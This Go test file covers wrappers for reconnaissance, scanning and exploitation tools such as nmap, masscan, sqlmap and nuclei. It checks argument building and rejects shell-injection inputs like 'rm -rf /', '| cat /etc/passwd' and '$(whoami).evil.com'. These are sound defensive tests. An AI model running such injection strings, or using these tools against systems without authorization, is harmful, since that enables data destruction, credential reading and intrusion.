package tools_test

import (
	"context"
	"encoding/json"
	"fmt"
	"testing"

	"github.com/yasindce1998/redhands/pkg/executor"
	"github.com/yasindce1998/redhands/tools/exploit/sqlmap"
	"github.com/yasindce1998/redhands/tools/fuzz/feroxbuster"
	"github.com/yasindce1998/redhands/tools/fuzz/ffuf"
	"github.com/yasindce1998/redhands/tools/fuzz/gobuster"
	"github.com/yasindce1998/redhands/tools/recon/amass"
	"github.com/yasindce1998/redhands/tools/recon/arjun"
	"github.com/yasindce1998/redhands/tools/recon/dns"
	"github.com/yasindce1998/redhands/tools/recon/gau"
	"github.com/yasindce1998/redhands/tools/recon/subfinder"
	"github.com/yasindce1998/redhands/tools/recon/wayback"
	"github.com/yasindce1998/redhands/tools/scan/masscan"
	"github.com/yasindce1998/redhands/tools/scan/nmap"
	"github.com/yasindce1998/redhands/tools/scan/rustscan"
	"github.com/yasindce1998/redhands/tools/vuln/nuclei"
	"github.com/yasindce1998/redhands/tools/web/httpx"
	"github.com/yasindce1998/redhands/tools/web/katana"
	"github.com/yasindce1998/redhands/tools/web/nikto"
	"github.com/yasindce1998/redhands/tools/web/testssl"
	"github.com/yasindce1998/redhands/tools/web/whatweb"
)

func mustJSON(v any) json.RawMessage {
	b, _ := json.Marshal(v)
	return b
}

func assertBinary(t *testing.T, mock *executor.MockExecutor, expected string) {
	t.Helper()
	call := mock.LastCall()
	if call.Binary != expected {
		t.Errorf("expected binary %q, got %q", expected, call.Binary)
	}
}

func assertContainsArg(t *testing.T, mock *executor.MockExecutor, flag string) {
	t.Helper()
	call := mock.LastCall()
	for _, a := range call.Args {
		if a == flag {
			return
		}
	}
	t.Errorf("expected args to contain %q, got %v", flag, call.Args)
}

func assertContainsArgPair(t *testing.T, mock *executor.MockExecutor, flag, value string) {
	t.Helper()
	call := mock.LastCall()
	for i, a := range call.Args {
		if a == flag && i+1 < len(call.Args) && call.Args[i+1] == value {
			return
		}
	}
	t.Errorf("expected args to contain %q %q, got %v", flag, value, call.Args)
}


// --- Nmap Port Scan ---

func TestNmapPortScan_BasicArgs(t *testing.T) {
	mock := executor.NewMock()
	mock.StdoutFn = func(_ string, _ []string) []byte {
		return []byte("<nmaprun></nmaprun>")
	}
	tool := nmap.NewPortScan(mock)

	params := mustJSON(map[string]any{
		"target":    "192.168.1.1",
		"ports":     "80,443",
		"scan_type": "syn",
	})

	_, err := tool.Execute(context.Background(), params)
	if err != nil {
		t.Fatal(err)
	}

	assertBinary(t, mock, "nmap")
	assertContainsArgPair(t, mock, "-p", "80,443")
	assertContainsArg(t, mock, "-sS")
	assertContainsArg(t, mock, "192.168.1.1")
}

func TestNmapPortScan_TopPorts(t *testing.T) {
	mock := executor.NewMock()
	mock.StdoutFn = func(_ string, _ []string) []byte {
		return []byte("<nmaprun></nmaprun>")
	}
	tool := nmap.NewPortScan(mock)

	params := mustJSON(map[string]any{
		"target":   "10.0.0.1",
		"top_ports": 100,
	})

	_, err := tool.Execute(context.Background(), params)
	if err != nil {
		t.Fatal(err)
	}

	assertBinary(t, mock, "nmap")
	assertContainsArgPair(t, mock, "--top-ports", "100")
}

func TestNmapPortScan_RejectsShellMetachars(t *testing.T) {
	mock := executor.NewMock()
	tool := nmap.NewPortScan(mock)

	injections := []string{
		"192.168.1.1; rm -rf /",
		"10.0.0.1 | cat /etc/passwd",
		"$(whoami).evil.com",
		"host`id`",
	}

	for _, target := range injections {
		t.Run(target, func(t *testing.T) {
			params := mustJSON(map[string]any{"target": target})
			result, err := tool.Execute(context.Background(), params)
			if err != nil {
				t.Fatal(err)
			}
			if !result.IsError {
				t.Error("expected error result for shell injection input")
			}
			if len(mock.Calls) > 0 {
				t.Error("executor should not be called for invalid input")
			}
			mock.Reset()
		})
	}
}

// --- Nmap Service Detect ---

func TestNmapServiceDetect_BasicArgs(t *testing.T) {
	mock := executor.NewMock()
	mock.StdoutFn = func(_ string, _ []string) []byte {
		return []byte("<nmaprun></nmaprun>")
	}
	tool := nmap.NewServiceDetect(mock)

	params := mustJSON(map[string]any{
		"target":    "10.0.0.1",
		"ports":     "22,80",
		"intensity": 7,
	})

	_, err := tool.Execute(context.Background(), params)
	if err != nil {
		t.Fatal(err)
	}

	assertBinary(t, mock, "nmap")
	assertContainsArg(t, mock, "-sV")
	assertContainsArgPair(t, mock, "--version-intensity", "7")
}

// --- Nmap OS Detect ---

func TestNmapOSDetect_Args(t *testing.T) {
	mock := executor.NewMock()
	mock.StdoutFn = func(_ string, _ []string) []byte {
		return []byte("<nmaprun></nmaprun>")
	}
	tool := nmap.NewOSDetect(mock)

	params := mustJSON(map[string]any{
		"target": "10.0.0.5",
	})

	_, err := tool.Execute(context.Background(), params)
	if err != nil {
		t.Fatal(err)
	}

	assertBinary(t, mock, "nmap")
	assertContainsArg(t, mock, "-O")
}

// --- Nmap Vuln Scan ---

func TestNmapVulnScan_ScriptArgs(t *testing.T) {
	mock := executor.NewMock()
	mock.StdoutFn = func(_ string, _ []string) []byte {
		return []byte("<nmaprun></nmaprun>")
	}
	tool := nmap.NewVulnScan(mock)

	params := mustJSON(map[string]any{
		"target":  "10.0.0.1",
		"scripts": "vuln,vulners",
	})

	_, err := tool.Execute(context.Background(), params)
	if err != nil {
		t.Fatal(err)
	}

	assertBinary(t, mock, "nmap")
	assertContainsArgPair(t, mock, "--script", "vuln,vulners")
}

// --- Masscan ---

func TestMasscan_BasicArgs(t *testing.T) {
	mock := executor.NewMock()
	mock.StdoutFn = func(_ string, _ []string) []byte {
		return []byte("Discovered open port 80/tcp on 10.0.0.1")
	}
	tool := masscan.NewMasscan(mock)

	params := mustJSON(map[string]any{
		"targets": "10.0.0.0/24",
		"ports":   "80,443",
		"rate":    1000,
	})

	_, err := tool.Execute(context.Background(), params)
	if err != nil {
		t.Fatal(err)
	}

	assertBinary(t, mock, "masscan")
	assertContainsArgPair(t, mock, "-p", "80,443")
	assertContainsArgPair(t, mock, "--rate", "1000")
	assertContainsArg(t, mock, "10.0.0.0/24")
}

func TestMasscan_RejectsShellMetachars(t *testing.T) {
	mock := executor.NewMock()
	tool := masscan.NewMasscan(mock)

	params := mustJSON(map[string]any{
		"targets": "10.0.0.1; whoami",
		"ports":   "80",
	})

	result, err := tool.Execute(context.Background(), params)
	if err != nil {
		t.Fatal(err)
	}
	if !result.IsError {
		t.Error("expected error result for shell injection")
	}
}

// --- Rustscan ---

func TestRustscan_BasicArgs(t *testing.T) {
	mock := executor.NewMock()
	mock.StdoutFn = func(_ string, _ []string) []byte {
		return []byte("Open 10.0.0.1:80\nOpen 10.0.0.1:443")
	}
	tool := rustscan.NewRustScan(mock)

	params := mustJSON(map[string]any{
		"target":    "10.0.0.1",
		"ports":     "1-1000",
		"batch_size": 500,
	})

	_, err := tool.Execute(context.Background(), params)
	if err != nil {
		t.Fatal(err)
	}

	assertBinary(t, mock, "rustscan")
	assertContainsArgPair(t, mock, "-a", "10.0.0.1")
	assertContainsArgPair(t, mock, "-b", "500")
}

// --- Subfinder ---

func TestSubfinder_BasicArgs(t *testing.T) {
	mock := executor.NewMock()
	mock.StdoutFn = func(_ string, _ []string) []byte {
		return []byte("api.example.com\nwww.example.com")
	}
	tool := subfinder.NewSubdomainEnum(mock)

	params := mustJSON(map[string]any{
		"domain":   "example.com",
		"all":      true,
		"timeout":  30,
	})

	_, err := tool.Execute(context.Background(), params)
	if err != nil {
		t.Fatal(err)
	}

	assertBinary(t, mock, "subfinder")
	assertContainsArgPair(t, mock, "-d", "example.com")
	assertContainsArg(t, mock, "-all")
	assertContainsArgPair(t, mock, "-timeout", "30")
}

// --- Amass ---

func TestAmass_EnumMode(t *testing.T) {
	mock := executor.NewMock()
	mock.StdoutFn = func(_ string, _ []string) []byte {
		return []byte("sub.example.com\n")
	}
	tool := amass.NewASNEnum(mock)

	params := mustJSON(map[string]any{
		"domain": "example.com",
		"mode":   "enum",
		"brute":  true,
	})

	_, err := tool.Execute(context.Background(), params)
	if err != nil {
		t.Fatal(err)
	}

	assertBinary(t, mock, "amass")
	assertContainsArg(t, mock, "enum")
	assertContainsArgPair(t, mock, "-d", "example.com")
	assertContainsArg(t, mock, "-brute")
}

// --- DNS ---

func TestDNS_BasicLookup(t *testing.T) {
	mock := executor.NewMock()
	mock.StdoutFn = func(_ string, _ []string) []byte {
		return []byte("example.com.\t300\tIN\tA\t93.184.216.34\n")
	}
	tool := dns.NewDNSLookup(mock)

	params := mustJSON(map[string]any{
		"domain":      "example.com",
		"record_type": "A",
		"short":       true,
	})

	_, err := tool.Execute(context.Background(), params)
	if err != nil {
		t.Fatal(err)
	}

	assertBinary(t, mock, "dig")
	assertContainsArg(t, mock, "example.com")
	assertContainsArg(t, mock, "A")
	assertContainsArg(t, mock, "+short")
}

func TestDNS_RejectsShellMetachars(t *testing.T) {
	mock := executor.NewMock()
	tool := dns.NewDNSLookup(mock)

	params := mustJSON(map[string]any{
		"domain": "example.com; cat /etc/passwd",
	})

	result, err := tool.Execute(context.Background(), params)
	if err != nil {
		t.Fatal(err)
	}
	if !result.IsError {
		t.Error("expected error result for shell injection")
	}
}

// --- Wayback ---

func TestWayback_BasicArgs(t *testing.T) {
	mock := executor.NewMock()
	mock.StdoutFn = func(_ string, _ []string) []byte {
		return []byte("http://example.com/page1\nhttp://example.com/page2\n")
	}
	tool := wayback.NewWayback(mock)

	params := mustJSON(map[string]any{
		"domain": "example.com",
		"limit":  50,
	})

	_, err := tool.Execute(context.Background(), params)
	if err != nil {
		t.Fatal(err)
	}

	assertBinary(t, mock, "waybackurls")
	assertContainsArg(t, mock, "example.com")
}

// --- GAU ---

func TestGAU_BasicArgs(t *testing.T) {
	mock := executor.NewMock()
	mock.StdoutFn = func(_ string, _ []string) []byte {
		return []byte("http://example.com/api/v1\n")
	}
	tool := gau.NewGAU(mock)

	params := mustJSON(map[string]any{
		"target":      "example.com",
		"providers":   "wayback,otx",
		"output_json": true,
	})

	_, err := tool.Execute(context.Background(), params)
	if err != nil {
		t.Fatal(err)
	}

	assertBinary(t, mock, "gau")
	assertContainsArgPair(t, mock, "--providers", "wayback,otx")
	assertContainsArg(t, mock, "--json")
}

// --- Arjun ---

func TestArjun_BasicArgs(t *testing.T) {
	mock := executor.NewMock()
	mock.StdoutFn = func(_ string, _ []string) []byte {
		return []byte(`{"url":"http://example.com","params":["id","page"]}`)
	}
	tool := arjun.NewArjun(mock)

	params := mustJSON(map[string]any{
		"url":        "http://example.com",
		"method":     "GET",
		"chunk_size": 250,
		"timeout":    15,
	})

	_, err := tool.Execute(context.Background(), params)
	if err != nil {
		t.Fatal(err)
	}

	assertBinary(t, mock, "arjun")
	assertContainsArgPair(t, mock, "-u", "http://example.com")
	assertContainsArgPair(t, mock, "-m", "GET")
	assertContainsArgPair(t, mock, "-c", "250")
	assertContainsArgPair(t, mock, "-T", "15")
}

// --- HTTPx ---

func TestHTTPx_BasicArgs(t *testing.T) {
	mock := executor.NewMock()
	mock.StdoutFn = func(_ string, _ []string) []byte {
		return []byte("http://example.com [200] [Example Domain]\n")
	}
	tool := httpx.NewHTTPProbe(mock)

	params := mustJSON(map[string]any{
		"targets":     "example.com",
		"status_code": true,
		"title":       true,
		"cdn":         true,
		"json_output": true,
	})

	_, err := tool.Execute(context.Background(), params)
	if err != nil {
		t.Fatal(err)
	}

	assertBinary(t, mock, "httpx")
	assertContainsArg(t, mock, "-status-code")
	assertContainsArg(t, mock, "-title")
	assertContainsArg(t, mock, "-cdn")
	assertContainsArg(t, mock, "-json")
}

// --- Katana ---

func TestKatana_BasicArgs(t *testing.T) {
	mock := executor.NewMock()
	mock.StdoutFn = func(_ string, _ []string) []byte {
		return []byte("https://example.com/login\nhttps://example.com/about\n")
	}
	tool := katana.NewCrawl(mock)

	params := mustJSON(map[string]any{
		"url":       "https://example.com",
		"depth":     3,
		"js_crawl":  true,
		"headless":  true,
		"rate_limit": 10,
	})

	_, err := tool.Execute(context.Background(), params)
	if err != nil {
		t.Fatal(err)
	}

	assertBinary(t, mock, "katana")
	assertContainsArgPair(t, mock, "-u", "https://example.com")
	assertContainsArgPair(t, mock, "-d", "3")
	assertContainsArg(t, mock, "-jc")
	assertContainsArg(t, mock, "-headless")
	assertContainsArgPair(t, mock, "-rl", "10")
}

func TestKatana_RejectsShellMetachars(t *testing.T) {
	mock := executor.NewMock()
	tool := katana.NewCrawl(mock)

	params := mustJSON(map[string]any{
		"url": "https://example.com; rm -rf /",
	})

	result, err := tool.Execute(context.Background(), params)
	if err != nil {
		t.Fatal(err)
	}
	if !result.IsError {
		t.Error("expected error result for shell injection")
	}
}

// --- Nikto ---

func TestNikto_BasicArgs(t *testing.T) {
	mock := executor.NewMock()
	mock.StdoutFn = func(_ string, _ []string) []byte {
		return []byte("+ Server: Apache/2.4.41\n+ /admin: Directory indexing found.\n")
	}
	tool := nikto.NewWebScan(mock)

	params := mustJSON(map[string]any{
		"host":    "example.com",
		"port":    8080,
		"ssl":     true,
		"tuning":  "123",
		"evasion": "1",
	})

	_, err := tool.Execute(context.Background(), params)
	if err != nil {
		t.Fatal(err)
	}

	assertBinary(t, mock, "nikto")
	assertContainsArgPair(t, mock, "-h", "example.com")
	assertContainsArgPair(t, mock, "-p", "8080")
	assertContainsArg(t, mock, "-ssl")
	assertContainsArgPair(t, mock, "-Tuning", "123")
	assertContainsArgPair(t, mock, "-evasion", "1")
}

// --- WhatWeb ---

func TestWhatWeb_BasicArgs(t *testing.T) {
	mock := executor.NewMock()
	mock.StdoutFn = func(_ string, _ []string) []byte {
		return []byte("http://example.com [200 OK] Apache[2.4.41]\n")
	}
	tool := whatweb.NewFingerprint(mock)

	params := mustJSON(map[string]any{
		"target":      "http://example.com",
		"aggression":  3,
		"proxy":       "http://127.0.0.1:8080",
		"user_agent":  "CustomBot/1.0",
		"max_threads": 25,
	})

	_, err := tool.Execute(context.Background(), params)
	if err != nil {
		t.Fatal(err)
	}

	assertBinary(t, mock, "whatweb")
	assertContainsArg(t, mock, "http://example.com")
	assertContainsArg(t, mock, "-a=3")
	assertContainsArgPair(t, mock, "--proxy", "http://127.0.0.1:8080")
	assertContainsArgPair(t, mock, "-U", "CustomBot/1.0")
	assertContainsArgPair(t, mock, "--max-threads", "25")
}

// --- TestSSL ---

func TestTestSSL_BasicArgs(t *testing.T) {
	mock := executor.NewMock()
	mock.StdoutFn = func(_ string, _ []string) []byte {
		return []byte("Testing protocols via sockets\nTLS 1.2 offered\n")
	}
	tool := testssl.NewTLSScan(mock)

	params := mustJSON(map[string]any{
		"host":     "example.com",
		"port":     443,
		"severity": "HIGH",
		"fast":     true,
		"parallel": true,
	})

	_, err := tool.Execute(context.Background(), params)
	if err != nil {
		t.Fatal(err)
	}

	assertBinary(t, mock, "testssl.sh")
	assertContainsArgPair(t, mock, "--severity", "HIGH")
	assertContainsArg(t, mock, "--fast")
	assertContainsArg(t, mock, "--parallel")
}

// --- Nuclei ---

func TestNuclei_BasicArgs(t *testing.T) {
	mock := executor.NewMock()
	mock.StdoutFn = func(_ string, _ []string) []byte {
		return []byte("[CVE-2021-1234] http://example.com\n")
	}
	tool := nuclei.NewNucleiScan(mock)

	params := mustJSON(map[string]any{
		"target":        "http://example.com",
		"severity":      "critical,high",
		"rate_limit":    100,
		"headless":      true,
		"template_id":   "cve-2021-1234",
		"concurrency":   25,
		"timeout":       10,
	})

	_, err := tool.Execute(context.Background(), params)
	if err != nil {
		t.Fatal(err)
	}

	assertBinary(t, mock, "nuclei")
	assertContainsArgPair(t, mock, "-u", "http://example.com")
	assertContainsArgPair(t, mock, "-severity", "critical,high")
	assertContainsArgPair(t, mock, "-rl", "100")
	assertContainsArg(t, mock, "-headless")
	assertContainsArgPair(t, mock, "-id", "cve-2021-1234")
	assertContainsArgPair(t, mock, "-c", "25")
	assertContainsArgPair(t, mock, "-timeout", "10")
}

// --- Gobuster ---

func TestGobuster_DirMode(t *testing.T) {
	mock := executor.NewMock()
	mock.StdoutFn = func(_ string, _ []string) []byte {
		return []byte("/admin (Status: 200)\n/login (Status: 302)\n")
	}
	tool := gobuster.NewDirBust(mock)

	params := mustJSON(map[string]any{
		"url":        "https://example.com",
		"wordlist":   "/usr/share/wordlists/common.txt",
		"mode":       "dir",
		"extensions": "php,html",
		"threads":    50,
	})

	_, err := tool.Execute(context.Background(), params)
	if err != nil {
		t.Fatal(err)
	}

	assertBinary(t, mock, "gobuster")
	assertContainsArg(t, mock, "dir")
	assertContainsArgPair(t, mock, "-u", "https://example.com")
	assertContainsArgPair(t, mock, "-w", "/usr/share/wordlists/common.txt")
	assertContainsArgPair(t, mock, "-x", "php,html")
	assertContainsArgPair(t, mock, "-t", "50")
}

func TestGobuster_DNSMode(t *testing.T) {
	mock := executor.NewMock()
	mock.StdoutFn = func(_ string, _ []string) []byte {
		return []byte("Found: admin.example.com\n")
	}
	tool := gobuster.NewDirBust(mock)

	params := mustJSON(map[string]any{
		"domain":   "example.com",
		"wordlist": "/usr/share/wordlists/subdomains.txt",
		"mode":     "dns",
	})

	_, err := tool.Execute(context.Background(), params)
	if err != nil {
		t.Fatal(err)
	}

	assertBinary(t, mock, "gobuster")
	assertContainsArg(t, mock, "dns")
	assertContainsArgPair(t, mock, "-d", "example.com")
}

// --- FFUF ---

func TestFFUF_BasicArgs(t *testing.T) {
	mock := executor.NewMock()
	mock.StdoutFn = func(_ string, _ []string) []byte {
		return []byte("admin [Status: 200, Size: 1234]\n")
	}
	tool := ffuf.NewWebFuzz(mock)

	params := mustJSON(map[string]any{
		"url":           "https://example.com/FUZZ",
		"wordlist":      "/usr/share/wordlists/common.txt",
		"match_codes":   "200,301",
		"filter_size":   "0",
		"threads":       40,
		"autocalibrate": true,
		"recursion":     true,
		"timeout":       15,
	})

	_, err := tool.Execute(context.Background(), params)
	if err != nil {
		t.Fatal(err)
	}

	assertBinary(t, mock, "ffuf")
	assertContainsArgPair(t, mock, "-u", "https://example.com/FUZZ")
	assertContainsArgPair(t, mock, "-w", "/usr/share/wordlists/common.txt")
	assertContainsArgPair(t, mock, "-mc", "200,301")
	assertContainsArgPair(t, mock, "-fs", "0")
	assertContainsArgPair(t, mock, "-t", "40")
	assertContainsArg(t, mock, "-ac")
	assertContainsArg(t, mock, "-recursion")
	assertContainsArgPair(t, mock, "-timeout", "15")
}

func TestFFUF_RejectsURLWithoutFUZZ(t *testing.T) {
	mock := executor.NewMock()
	tool := ffuf.NewWebFuzz(mock)

	params := mustJSON(map[string]any{
		"url":      "https://example.com/admin",
		"wordlist": "/tmp/list.txt",
	})

	result, err := tool.Execute(context.Background(), params)
	if err != nil {
		t.Fatal(err)
	}
	if !result.IsError {
		t.Error("expected error: URL must contain FUZZ keyword")
	}
}

// --- Feroxbuster ---

func TestFeroxbuster_BasicArgs(t *testing.T) {
	mock := executor.NewMock()
	mock.StdoutFn = func(_ string, _ []string) []byte {
		return []byte("200 GET 1234l http://example.com/admin\n")
	}
	tool := feroxbuster.NewFeroxbuster(mock)

	params := mustJSON(map[string]any{
		"url":          "https://example.com",
		"wordlist":     "/usr/share/wordlists/common.txt",
		"threads":      50,
		"depth":        3,
		"extensions":   "php,html",
		"rate_limit":   100,
		"auto_tune":    true,
		"auto_bail":    true,
		"time_limit":   "10m",
	})

	_, err := tool.Execute(context.Background(), params)
	if err != nil {
		t.Fatal(err)
	}

	assertBinary(t, mock, "feroxbuster")
	assertContainsArgPair(t, mock, "-u", "https://example.com")
	assertContainsArgPair(t, mock, "-w", "/usr/share/wordlists/common.txt")
	assertContainsArgPair(t, mock, "-t", "50")
	assertContainsArgPair(t, mock, "-d", "3")
	assertContainsArgPair(t, mock, "-x", "php,html")
	assertContainsArgPair(t, mock, "-L", "100")
	assertContainsArg(t, mock, "--auto-tune")
	assertContainsArg(t, mock, "--auto-bail")
	assertContainsArgPair(t, mock, "--time-limit", "10m")
}

// --- SQLMap ---

func TestSQLMap_BasicArgs(t *testing.T) {
	mock := executor.NewMock()
	mock.StdoutFn = func(_ string, _ []string) []byte {
		return []byte("[INFO] testing connection to the target URL\n")
	}
	tool := sqlmap.NewSQLMap(mock)

	params := mustJSON(map[string]any{
		"url":          "http://target.com/page?id=1",
		"level":        3,
		"risk":         2,
		"dbs":          true,
		"technique":    "BEU",
		"tamper":       "space2comment",
		"threads":      5,
		"random_agent": true,
		"proxy":        "http://127.0.0.1:8080",
		"dbms":         "MySQL",
		"timeout":      30,
	})

	_, err := tool.Execute(context.Background(), params)
	if err != nil {
		t.Fatal(err)
	}

	assertBinary(t, mock, "sqlmap")
	assertContainsArgPair(t, mock, "-u", "http://target.com/page?id=1")
	assertContainsArg(t, mock, "--batch")
	assertContainsArgPair(t, mock, "--level", "3")
	assertContainsArgPair(t, mock, "--risk", "2")
	assertContainsArg(t, mock, "--dbs")
	assertContainsArgPair(t, mock, "--technique", "BEU")
	assertContainsArgPair(t, mock, "--tamper", "space2comment")
	assertContainsArgPair(t, mock, "--threads", "5")
	assertContainsArg(t, mock, "--random-agent")
	assertContainsArgPair(t, mock, "--proxy", "http://127.0.0.1:8080")
	assertContainsArgPair(t, mock, "--dbms", "MySQL")
	assertContainsArgPair(t, mock, "--timeout", "30")
}

func TestSQLMap_RejectsInvalidURL(t *testing.T) {
	mock := executor.NewMock()
	tool := sqlmap.NewSQLMap(mock)

	params := mustJSON(map[string]any{
		"url": "not-a-url",
	})

	result, err := tool.Execute(context.Background(), params)
	if err != nil {
		t.Fatal(err)
	}
	if !result.IsError {
		t.Error("expected error for invalid URL")
	}
}

func TestSQLMap_RejectsShellMetachars(t *testing.T) {
	mock := executor.NewMock()
	tool := sqlmap.NewSQLMap(mock)

	params := mustJSON(map[string]any{
		"url": "http://example.com/page?id=1; DROP TABLE users",
	})

	result, err := tool.Execute(context.Background(), params)
	if err != nil {
		t.Fatal(err)
	}
	if !result.IsError {
		t.Error("expected error for shell metachars in URL")
	}
}

// --- Cross-cutting: All tools reject missing required fields ---

func TestAllTools_MissingRequiredField(t *testing.T) {
	mock := executor.NewMock()

	tests := []struct {
		name   string
		exec   func(ctx context.Context, params json.RawMessage) error
	}{
		{"nmap_port_scan", func(ctx context.Context, p json.RawMessage) error {
			r, _ := nmap.NewPortScan(mock).Execute(ctx, p)
			if !r.IsError { return nil }
			return nil
		}},
		{"masscan", func(ctx context.Context, p json.RawMessage) error {
			r, _ := masscan.NewMasscan(mock).Execute(ctx, p)
			if r.IsError { return nil }
			return fmt.Errorf("unexpected success")
		}},
		{"nikto", func(ctx context.Context, p json.RawMessage) error {
			r, _ := nikto.NewWebScan(mock).Execute(ctx, p)
			if r.IsError { return nil }
			return fmt.Errorf("unexpected success")
		}},
		{"katana", func(ctx context.Context, p json.RawMessage) error {
			r, _ := katana.NewCrawl(mock).Execute(ctx, p)
			if r.IsError { return nil }
			return fmt.Errorf("unexpected success")
		}},
		{"sqlmap", func(ctx context.Context, p json.RawMessage) error {
			r, _ := sqlmap.NewSQLMap(mock).Execute(ctx, p)
			if r.IsError { return nil }
			return fmt.Errorf("unexpected success")
		}},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			emptyParams := mustJSON(map[string]any{})
			err := tt.exec(context.Background(), emptyParams)
			if err != nil {
				t.Errorf("%s: did not reject empty params", tt.name)
			}
		})
	}
}
